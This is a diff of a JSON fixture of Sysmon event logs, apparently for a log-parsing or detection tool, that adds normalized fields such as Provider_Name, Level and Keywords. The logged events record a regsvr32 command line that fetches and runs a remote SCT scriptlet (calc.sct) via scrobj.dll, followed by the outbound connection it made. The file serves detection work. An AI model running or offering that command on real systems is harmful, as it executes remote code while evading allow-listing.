@@ -13,6 +13,7 @@
           "Channel": "Microsoft-Windows-Sysmon/Operational",
           "Computer": "IEWIN7",
           "Provider": "Microsoft-Windows-Sysmon",
+          "Provider_Name": "Microsoft-Windows-Sysmon",
           "RuleName": "",
           "UtcTime": "2019-05-13 18:03:19.497",
           "ProcessGuid": "{365abb72-b167-5cd9-0000-001062160c00}",
@@ -26,14 +27,16 @@
           "CurrentDirectory": "C:\\Windows\\system32\\",
           "User": "IEWIN7\\IEUser",
           "LogonGuid": "{365abb72-b0ec-5cd9-0000-00201d340100}",
-          "LogonId": "0x000000000001341d",
+          "LogonId": "0x1341d",
           "TerminalSessionId": "1",
           "IntegrityLevel": "Medium",
           "Hashes": "SHA1=A774A816662FF5B75669AA5BCE751BAB9D0972B8,MD5=432BE6CF7311062633459EEF6B242FB5,SHA256=890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B,IMPHASH=A2DAD36BD73280726DA578EB659D0583",
           "ParentProcessGuid": "{365abb72-b0ec-5cd9-0000-0010d9d20000}",
           "ParentProcessId": "944",
           "ParentImage": "C:\\Windows\\System32\\svchost.exe",
-          "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs"
+          "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs",
+          "Level": "4",
+          "Keywords": "0x8000000000000000"
         },
         "raw": "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"></Provider>\n<EventID Qualifiers=\"\">1</EventID>\n<Version>5</Version>\n<Level>4</Level>\n<Task>1</Task>\n<Opcode>0</Opcode>\n<Keywords>0x8000000000000000</Keywords>\n<TimeCreated SystemTime=\"2019-05-13 18:03:19.681479+00:00\"></TimeCreated>\n<EventRecordID>17287</EventRecordID>\n<Correlation ActivityID=\"\" RelatedActivityID=\"\"></Correlation>\n<Execution ProcessID=\"276\" ThreadID=\"1000\"></Execution>\n<Channel>Microsoft-Windows-Sysmon/Operational</Channel>\n<Computer>IEWIN7</Computer>\n<Security UserID=\"S-1-5-18\"></Security>\n</System>\n<EventData><Data Name=\"RuleName\"></Data>\n<Data Name=\"UtcTime\">2019-05-13 18:03:19.497</Data>\n<Data Name=\"ProcessGuid\">{365abb72-b167-5cd9-0000-001062160c00}</Data>\n<Data Name=\"ProcessId\">2476</Data>\n<Data Name=\"Image\">C:\\Windows\\System32\\regsvr32.exe</Data>\n<Data Name=\"FileVersion\">6.1.7600.16385 (win7_rtm.090713-1255)</Data>\n<Data Name=\"Description\">Microsoft(C) Register Server</Data>\n<Data Name=\"Product\">Microsoft&#174; Windows&#174; Operating System</Data>\n<Data Name=\"Company\">Microsoft Corporation</Data>\n<Data Name=\"CommandLine\">/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll</Data>\n<Data Name=\"CurrentDirectory\">C:\\Windows\\system32\\</Data>\n<Data Name=\"User\">IEWIN7\\IEUser</Data>\n<Data Name=\"LogonGuid\">{365abb72-b0ec-5cd9-0000-00201d340100}</Data>\n<Data Name=\"LogonId\">0x000000000001341d</Data>\n<Data Name=\"TerminalSessionId\">1</Data>\n<Data Name=\"IntegrityLevel\">Medium</Data>\n<Data Name=\"Hashes\">SHA1=A774A816662FF5B75669AA5BCE751BAB9D0972B8,MD5=432BE6CF7311062633459EEF6B242FB5,SHA256=890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B,IMPHASH=A2DAD36BD73280726DA578EB659D0583</Data>\n<Data Name=\"ParentProcessGuid\">{365abb72-b0ec-5cd9-0000-0010d9d20000}</Data>\n<Data Name=\"ParentProcessId\">944</Data>\n<Data Name=\"ParentImage\">C:\\Windows\\System32\\svchost.exe</Data>\n<Data Name=\"ParentCommandLine\">C:\\Windows\\system32\\svchost.exe -k netsvcs</Data>\n</EventData>\n</Event>\n"
       },
@@ -71,6 +74,7 @@
           "Channel": "Microsoft-Windows-Sysmon/Operational",
           "Computer": "IEWIN7",
           "Provider": "Microsoft-Windows-Sysmon",
+          "Provider_Name": "Microsoft-Windows-Sysmon",
           "RuleName": "",
           "UtcTime": "2019-05-13 18:03:19.497",
           "ProcessGuid": "{365abb72-b167-5cd9-0000-001062160c00}",
@@ -84,14 +88,16 @@
           "CurrentDirectory": "C:\\Windows\\system32\\",
           "User": "IEWIN7\\IEUser",
           "LogonGuid": "{365abb72-b0ec-5cd9-0000-00201d340100}",
-          "LogonId": "0x000000000001341d",
+          "LogonId": "0x1341d",
           "TerminalSessionId": "1",
           "IntegrityLevel": "Medium",
           "Hashes": "SHA1=A774A816662FF5B75669AA5BCE751BAB9D0972B8,MD5=432BE6CF7311062633459EEF6B242FB5,SHA256=890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B,IMPHASH=A2DAD36BD73280726DA578EB659D0583",
           "ParentProcessGuid": "{365abb72-b0ec-5cd9-0000-0010d9d20000}",
           "ParentProcessId": "944",
           "ParentImage": "C:\\Windows\\System32\\svchost.exe",
-          "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs"
+          "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs",
+          "Level": "4",
+          "Keywords": "0x8000000000000000"
         },
         "raw": "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"></Provider>\n<EventID Qualifiers=\"\">1</EventID>\n<Version>5</Version>\n<Level>4</Level>\n<Task>1</Task>\n<Opcode>0</Opcode>\n<Keywords>0x8000000000000000</Keywords>\n<TimeCreated SystemTime=\"2019-05-13 18:03:19.681479+00:00\"></TimeCreated>\n<EventRecordID>17287</EventRecordID>\n<Correlation ActivityID=\"\" RelatedActivityID=\"\"></Correlation>\n<Execution ProcessID=\"276\" ThreadID=\"1000\"></Execution>\n<Channel>Microsoft-Windows-Sysmon/Operational</Channel>\n<Computer>IEWIN7</Computer>\n<Security UserID=\"S-1-5-18\"></Security>\n</System>\n<EventData><Data Name=\"RuleName\"></Data>\n<Data Name=\"UtcTime\">2019-05-13 18:03:19.497</Data>\n<Data Name=\"ProcessGuid\">{365abb72-b167-5cd9-0000-001062160c00}</Data>\n<Data Name=\"ProcessId\">2476</Data>\n<Data Name=\"Image\">C:\\Windows\\System32\\regsvr32.exe</Data>\n<Data Name=\"FileVersion\">6.1.7600.16385 (win7_rtm.090713-1255)</Data>\n<Data Name=\"Description\">Microsoft(C) Register Server</Data>\n<Data Name=\"Product\">Microsoft&#174; Windows&#174; Operating System</Data>\n<Data Name=\"Company\">Microsoft Corporation</Data>\n<Data Name=\"CommandLine\">/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll</Data>\n<Data Name=\"CurrentDirectory\">C:\\Windows\\system32\\</Data>\n<Data Name=\"User\">IEWIN7\\IEUser</Data>\n<Data Name=\"LogonGuid\">{365abb72-b0ec-5cd9-0000-00201d340100}</Data>\n<Data Name=\"LogonId\">0x000000000001341d</Data>\n<Data Name=\"TerminalSessionId\">1</Data>\n<Data Name=\"IntegrityLevel\">Medium</Data>\n<Data Name=\"Hashes\">SHA1=A774A816662FF5B75669AA5BCE751BAB9D0972B8,MD5=432BE6CF7311062633459EEF6B242FB5,SHA256=890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B,IMPHASH=A2DAD36BD73280726DA578EB659D0583</Data>\n<Data Name=\"ParentProcessGuid\">{365abb72-b0ec-5cd9-0000-0010d9d20000}</Data>\n<Data Name=\"ParentProcessId\">944</Data>\n<Data Name=\"ParentImage\">C:\\Windows\\System32\\svchost.exe</Data>\n<Data Name=\"ParentCommandLine\">C:\\Windows\\system32\\svchost.exe -k netsvcs</Data>\n</EventData>\n</Event>\n"
       },
@@ -129,6 +135,7 @@
           "Channel": "Microsoft-Windows-Sysmon/Operational",
           "Computer": "IEWIN7",
           "Provider": "Microsoft-Windows-Sysmon",
+          "Provider_Name": "Microsoft-Windows-Sysmon",
           "RuleName": "",
           "UtcTime": "2019-05-13 18:03:20.485",
           "ProcessGuid": "{365abb72-b167-5cd9-0000-001062160c00}",
@@ -146,7 +153,9 @@
           "DestinationIp": "151.101.128.133",
           "DestinationHostname": "",
           "DestinationPort": "443",
-          "DestinationPortName": "https"
+          "DestinationPortName": "https",
+          "Level": "4",
+          "Keywords": "0x8000000000000000"
         },
         "raw": "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"></Provider>\n<EventID Qualifiers=\"\">3</EventID>\n<Version>5</Version>\n<Level>4</Level>\n<Task>3</Task>\n<Opcode>0</Opcode>\n<Keywords>0x8000000000000000</Keywords>\n<TimeCreated SystemTime=\"2019-05-13 18:03:21.212896+00:00\"></TimeCreated>\n<EventRecordID>17289</EventRecordID>\n<Correlation ActivityID=\"\" RelatedActivityID=\"\"></Correlation>\n<Execution ProcessID=\"276\" ThreadID=\"2056\"></Execution>\n<Channel>Microsoft-Windows-Sysmon/Operational</Channel>\n<Computer>IEWIN7</Computer>\n<Security UserID=\"S-1-5-18\"></Security>\n</System>\n<EventData><Data Name=\"RuleName\"></Data>\n<Data Name=\"UtcTime\">2019-05-13 18:03:20.485</Data>\n<Data Name=\"ProcessGuid\">{365abb72-b167-5cd9-0000-001062160c00}</Data>\n<Data Name=\"ProcessId\">2476</Data>\n<Data Name=\"Image\">C:\\Windows\\System32\\regsvr32.exe</Data>\n<Data Name=\"User\">IEWIN7\\IEUser</Data>\n<Data Name=\"Protocol\">tcp</Data>\n<Data Name=\"Initiated\">True</Data>\n<Data Name=\"SourceIsIpv6\">False</Data>\n<Data Name=\"SourceIp\">10.0.2.15</Data>\n<Data Name=\"SourceHostname\">IEWIN7</Data>\n<Data Name=\"SourcePort\">49159</Data>\n<Data Name=\"SourcePortName\"></Data>\n<Data Name=\"DestinationIsIpv6\">False</Data>\n<Data Name=\"DestinationIp\">151.101.128.133</Data>\n<Data Name=\"DestinationHostname\"></Data>\n<Data Name=\"DestinationPort\">443</Data>\n<Data Name=\"DestinationPortName\">https</Data>\n</EventData>\n</Event>\n"
       },
